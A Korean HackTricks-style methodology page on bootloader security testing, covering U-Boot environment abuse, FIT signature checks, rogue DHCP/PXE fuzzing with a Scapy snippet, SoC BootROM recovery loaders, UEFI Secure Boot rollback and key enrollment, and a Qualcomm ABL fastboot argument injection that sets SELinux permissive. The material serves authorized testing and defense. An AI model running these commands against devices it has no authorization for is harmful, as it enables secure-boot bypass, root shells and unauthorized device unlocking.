# Bootloader 테스트

{{#include ../../banners/hacktricks-training.md}}

U-Boot 및 UEFI급 loader와 같은 bootloader를 테스트하고 기기 시작 구성을 수정할 때는 다음 단계를 권장합니다. 초기 단계에서 코드 실행을 확보하고, 서명 및 롤백 보호 기능을 평가하며, 복구 또는 네트워크 부팅 경로를 악용하는 데 집중하세요.

관련 항목: bl2_ext 패치를 통한 MediaTek secure-boot 우회:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 빠른 공략과 환경 변수 악용

1. 인터프리터 셸에 접근
   - 부팅 중 `bootcmd`가 실행되기 전에 알려진 중단 키(대개 아무 키, 0, 스페이스 또는 보드별 "매직" 시퀀스)를 눌러 U-Boot 프롬프트로 진입합니다.<sup>[[1]](#references)</sup>

2. 부팅 상태와 변수 확인
   - 유용한 명령:
     - `printenv` (환경 변수 출력)
     - `bdinfo` (보드 정보, 메모리 주소)
     - `help bootm; help booti; help bootz` (지원되는 커널 부팅 방식)
     - `help ext4load; help fatload; help tftpboot` (사용 가능한 loader)

3. 루트 셸을 얻도록 부팅 인자 수정
   - 일반적인 init 대신 커널이 셸로 진입하도록 `init=/bin/sh`를 추가합니다:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP 서버에서 네트워크 부팅
   - 네트워크를 구성하고 LAN에서 커널/FIT 이미지를 가져옵니다:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 환경을 통해 변경 사항 지속시키기
   - env 저장소가 쓰기 보호되어 있지 않다면, 제어권을 지속시킬 수 있습니다:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`처럼 fallback 경로에 영향을 주는 변수를 확인합니다. 잘못 구성된 값으로 인해 shell에 반복적으로 진입할 수 있습니다.

6. debug/unsafe 기능 확인
   - 다음 항목을 살펴봅니다: `bootdelay` > 0, `autoboot` 비활성화, 제한 없는 `usb start; fatload usb 0:1 ...`, serial을 통한 `loady`/`loads` 사용 가능 여부, 신뢰할 수 없는 미디어에서 `env import` 실행, signature 검증 없이 로드되는 kernel/ramdisk.

7. U-Boot 이미지/검증 테스트
   - 플랫폼에서 FIT 이미지를 사용한 secure/verified boot를 지원한다고 주장하는 경우, 서명되지 않은 이미지와 변조된 이미지를 모두 시도합니다:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`가 없거나 레거시 `verify=n` 동작을 사용하면 임의의 payload를 boot할 수 있는 경우가 많습니다.
   - 단순히 허용/거부 결과만 확인하고 끝내지 마세요. 최근 FIT 연구에 따르면 verification 경로 자체가 pre-auth attack surface가 될 수 있습니다. 외부 저장 FIT 데이터(`data-offset`, `data-position`, `data-size`), 서명된 configuration 선택, `loadables`, overlay / `extra-conf` 처리에 대해 negative test를 수행하세요.
   - 일치하는 소스 트리가 있다면, 실제 하드웨어를 건드리기 전에 `test/vboot/vboot_test.sh`를 사용해 U-Boot sandbox에서 FIT verification 동작을 빠르게 재현할 수 있습니다.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, script bootflow
   - 최신 U-Boot 빌드에서는 `bootcmd`가 Standard Boot를 감싸는 wrapper인 경우가 많습니다. 즉, 화면에 보이는 환경이 무해해 보여도 쓰기 가능한 미디어, PXE 또는 SPI flash가 실제 trust boundary가 될 수 있습니다.
   - `extlinux` bootmeth는 `/` 및 `/boot` 아래에서 `extlinux/extlinux.conf`를 검색하고, script bootmeth는 먼저 `boot.scr.uimg`를 검색한 다음 `boot.scr`을 검색합니다. 네트워크 boot에서는 script 파일 이름을 `boot_script_dhcp`에서 가져올 수 있습니다.
   - 유용한 triage 명령:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - 테스트할 악용 사례: `boot_targets`에서 앞쪽에 위치한 공격자가 제어하는 USB/SD 미디어, 쓰기 가능한 `/boot/extlinux/extlinux.conf`, `boot.scr`를 제공하는 rogue TFTP, 또는 `script_offset_f`를 통한 SPI 기반 스크립트 실행.
   - 플랫폼이 FIT verification에 의존한다면, 설정이 이미지별로만 서명된 것이 아니라 configuration 수준에서도 서명되었는지 확인하세요. `required-mode=all`은 필수 키 중 하나만 허용하는 것보다 더 강력합니다.

## Network-boot surface (DHCP/PXE) and rogue servers

9. PXE/DHCP parameter fuzzing
   - U-Boot의 legacy BOOTP/DHCP 처리에는 메모리 안전성 문제가 발생한 적이 있습니다. 예를 들어 CVE‑2024‑42040은 조작된 DHCP 응답을 통한 메모리 disclosure를 다루며, U-Boot 메모리의 바이트가 네트워크를 통해 유출될 수 있습니다.<sup>[[4]](#references)</sup> 지나치게 길거나 특이한 값(option 67 `bootfile-name`, vendor options, `file`/`servername` 필드)을 사용해 DHCP/PXE 코드 경로를 테스트하고 hang/leak이 발생하는지 확인하세요.
   - netboot 중 부팅 파라미터를 테스트하는 최소 Scapy snippet:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - OS 측 provisioning scripts와 연결될 때 PXE filename 필드가 sanitization 없이 shell/loader 로직으로 전달되는지도 확인합니다.

10. Rogue DHCP server command injection 테스트
   - rogue DHCP/PXE 서비스를 설정하고, filename 또는 options 필드에 문자를 삽입해 boot chain의 후속 단계에서 command interpreter에 도달할 수 있는지 시도합니다. Metasploit의 DHCP auxiliary, `dnsmasq` 또는 사용자 지정 Scapy scripts를 사용하면 됩니다. 먼저 lab network를 격리해야 합니다.

## 일반 boot를 재정의하는 SoC ROM recovery mode

많은 SoC에는 flash image가 유효하지 않더라도 USB/UART를 통해 코드를 받아들이는 BootROM "loader" mode가 있습니다. secure-boot fuse가 설정되지 않았다면 boot chain의 매우 초기 단계에서 임의 코드 실행이 가능할 수 있습니다.

- NXP i.MX (Serial Download Mode)
  - 도구: `uuu` (mfgtools3) 또는 `imx-usb-loader`.
  - 예: `imx-usb-loader u-boot.imx`를 실행해 custom U-Boot를 RAM에 전송하고 실행합니다.
- Allwinner (FEL)
  - 도구: `sunxi-fel`.
  - 예: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 또는 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - 도구: `rkdeveloptool`.
  - 예: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`을 실행해 loader를 준비하고 custom U-Boot를 업로드합니다.

기기의 secure-boot eFuses/OTP가 설정되어 있는지 확인합니다. 설정되어 있지 않다면, BootROM download mode는 첫 번째 단계 payload를 SRAM/DRAM에서 직접 실행해 상위 단계의 모든 검증(U-Boot, kernel, rootfs)을 우회하는 경우가 많습니다.

## UEFI/PC-class bootloader: 빠른 확인 항목

11. ESP 변조, rollback 및 key enrollment 테스트
   - EFI System Partition (ESP)을 마운트하고 loader 구성 요소를 확인합니다: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo 경로.
   - 가능하면 OS에서 Secure Boot 상태와 key database를 덤프합니다:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - 플랫폼이 Setup Mode 상태이거나 인증 없이 키 등록을 허용하거나 테스트용/기본 Platform Key(PKfail 유형)가 탑재되어 있으면, 로컬 관리자나 물리적 공격자가 자신의 KEK/db를 등록해 Secure Boot가 “enabled”로 표시되는 상태를 유지하면서 임의의 EFI 바이너리를 부팅할 수 있습니다.<sup>[[3]](#references)</sup>
   - Secure Boot revocation(dbx)이 최신 상태가 아니라면 다운그레이드된 부팅 구성 요소나 취약점이 알려진 서명된 부팅 구성 요소로 부팅을 시도하세요. 플랫폼이 여전히 오래된 shim/bootmanager를 신뢰한다면, ESP에서 자신의 kernel이나 `grub.cfg`를 로드해 지속성을 확보할 수 있는 경우가 많습니다.
   - Windows에서는 패치된 호스트도 `Microsoft Windows Production PCA 2011` 서명자가 firmware `dbx`에 없으면 취약한 서명된 boot manager를 여전히 허용할 수 있습니다. 이는 BlackX에서 관찰되었습니다.<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop 유형의 우회 기법으로 공격자 MOK를 등록할 수 있으며, 이후 정상적인 shim이 해당 키로 서명된 EFI payload를 로드할 수 있습니다.<sup>[[12]](#references)[[13]](#references)</sup> 나중에 이전 Windows 서명자를 폐기해도 등록된 MOK는 제거되지 않으므로, 해당 shim을 계속 신뢰하는 경우 shim 기반 경로가 지속될 수 있습니다.<sup>[[12]](#references)</sup>
   - 승인된 UEFI 머신에서 이 롤백 경로를 테스트하기 전에 Windows 업데이트 기록만 확인하지 말고 **유효한 firmware revocation 상태**를 확인하세요.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft는 `dbx`의 2011 서명자를 확인하는 읽기 전용 관리자 권한 PowerShell 명령을 제공합니다.<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False`는 단서일 뿐입니다. 복구 가능한 실험 환경에서 구체적인 서명된 부팅 구성 요소와 다른 revocation을 확인하세요.<sup>[[12]](#references)[[14]](#references)</sup> 보류 중인 레지스트리 업데이트나 만료된 서명 인증서는 `dbx` revocation이 완료된 것과 같지 않습니다.<sup>[[13]](#references)[[14]](#references)</sup>

12. 오래된 shim / SBAT / dbx revocation 테스트
   - 오래된 Microsoft 서명 shim과 vendor fork는 revocation이 오래된 상태라면 여전히 BYOVD 방식의 bootkit 경로로 악용될 수 있습니다. 격리된 실험 환경에서 과거에 취약했던 shim을 ESP에 넣고 자체 `grubx64.efi` 또는 kernel을 chainload해 보세요.<sup>[[11]](#references)</sup>
   - 빠른 초기 분류:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - shim이 revocation list에 있는데도 계속 실행된다면, firmware/OS의 `dbx` 업데이트가 오래되었거나 upstream SBAT 보호 기능이 적용되지 않은 forked loader를 신뢰하는 것입니다.

13. Boot logo 파싱 취약점(LogoFAIL 계열)
   - 여러 OEM/IBV firmware가 boot logo를 처리하는 DXE의 이미지 파싱 취약점에 노출되었습니다. 공격자가 vendor별 경로(예: `\EFI\<vendor>\logo\*.bmp`)에 조작된 이미지를 ESP에 넣고 재부팅할 수 있다면, Secure Boot가 활성화되어 있어도 초기 부팅 중 code execution이 가능할 수 있습니다. 플랫폼이 사용자가 제공한 logo를 허용하는지, 그리고 OS에서 해당 경로에 쓸 수 있는지 테스트하세요.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) 신뢰 격차

Qualcomm의 ABL을 사용해 **Generic Bootloader Library (GBL)**를 로드하는 Android 16 기기에서는 ABL이 `efisp` 파티션에서 로드하는 UEFI app을 **인증**하는지 확인하세요. ABL이 UEFI app의 **존재 여부**만 확인하고 서명을 검증하지 않는다면, `efisp`에 쓸 수 있는 primitive가 부팅 시 **OS 이전의 unsigned code execution**으로 이어집니다.<sup>[[6]](#references)[[7]](#references)</sup>

실제 점검 및 악용 경로:

- **efisp 쓰기 primitive**: `efisp`에 사용자 지정 UEFI app을 쓸 방법(root/privileged service, OEM app 버그, recovery/fastboot 경로)이 필요합니다. 이 방법이 없다면 GBL 로딩 취약점에 직접 접근할 수 없습니다.<sup>[[6]](#references)</sup>
- **fastboot OEM 인자 주입** (ABL 버그): 일부 빌드는 `fastboot oem set-gpu-preemption`에 추가 토큰을 허용하고 이를 kernel cmdline에 덧붙입니다. 이를 이용해 SELinux를 permissive 모드로 설정하여 보호된 파티션에 쓸 수 있습니다:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  기기가 패치된 경우, 해당 명령은 추가 인수를 거부해야 합니다.<sup>[[5]](#references)[[6]](#references)</sup>
- **persistent flags를 통한 Bootloader unlock**: boot-stage payload는 persistent unlock flags(예: `is_unlocked=1`, `is_unlocked_critical=1`)를 변경해 OEM 서버/승인 절차 없이 `fastboot oem unlock`을 모방할 수 있습니다. 이로 인해 다음 재부팅 후에도 지속되는 상태 변경이 발생합니다.<sup>[[6]](#references)</sup>

방어/초기 분석 참고 사항:

- ABL이 `efisp`의 GBL/UEFI payload에 대해 signature verification을 수행하는지 확인하세요. 수행하지 않는다면 `efisp`를 고위험 persistence 표면으로 간주하세요.
- ABL fastboot OEM handler가 **인수 개수를 검증**하고 추가 토큰을 거부하도록 패치되었는지 확인하세요.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware caution

초기 부팅 중 SPI/NAND flash와 상호작용할 때(예: 읽기를 우회하기 위해 핀을 접지하는 경우) 주의하고, 항상 flash datasheet를 확인하세요. 타이밍이 맞지 않는 단락은 기기나 프로그래머를 손상시킬 수 있습니다.

## Notes and additional tips

- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 사용해 environment blob을 RAM과 storage 간에 이동해 보세요. 일부 플랫폼에서는 인증 없이 removable media에서 env를 가져올 수 있습니다.
- `extlinux.conf`를 통해 부팅하는 Linux 기반 시스템에서 persistence를 확보하려면, signature check가 적용되지 않는 경우 boot partition의 `APPEND` 행을 수정해(`init=/bin/sh` 또는 `rd.break`를 삽입) 충분한 경우가 많습니다.
- 대상이 dual-slot / A/B update를 사용하는 경우, bootloader 자체의 외부에 있는 updater 전용 trust gap을 놓치지 않도록 [firmware analysis overview](README.md)에서 anti-rollback 및 slot-desync 기법을 살펴보세요.
- userland에서 `fw_printenv/fw_setenv`를 제공하는 경우, `/etc/fw_env.config`가 실제 env storage와 일치하는지 확인하세요. 잘못된 offset은 엉뚱한 MTD 영역을 읽거나 쓰게 합니다.

## References

- [1] [Firmware 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL 발견: 시스템 부팅 중 이미지 파싱의 위험성](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: 신뢰할 수 없는 Platform Key가 UEFI 생태계의 Secure Boot를 약화시키다](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 상세 정보](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [선제적 대응: 검증되지 않은 문자열 두 개를 이용한 Xiaomi 잠금 해제](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit으로 공격자가 bootloader를 잠금 해제할 수 있다](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) 아키텍처](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: 신뢰할 수 없는 입력이 kernel cmdline으로 전파되는 문제 수정](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value 명령에 검사 추가](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [부팅에 부적합: U-Boot의 FIT signature verification 무력화](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [취약점 공지 VU#616257 - Microsoft 서명 UEFI shim bootloader의 Secure Boot 우회 취약점](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: 사실로 확인된 주장](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus와 유사한 UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot 변경에 따른 Windows Boot Manager revocation 관리 방법](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
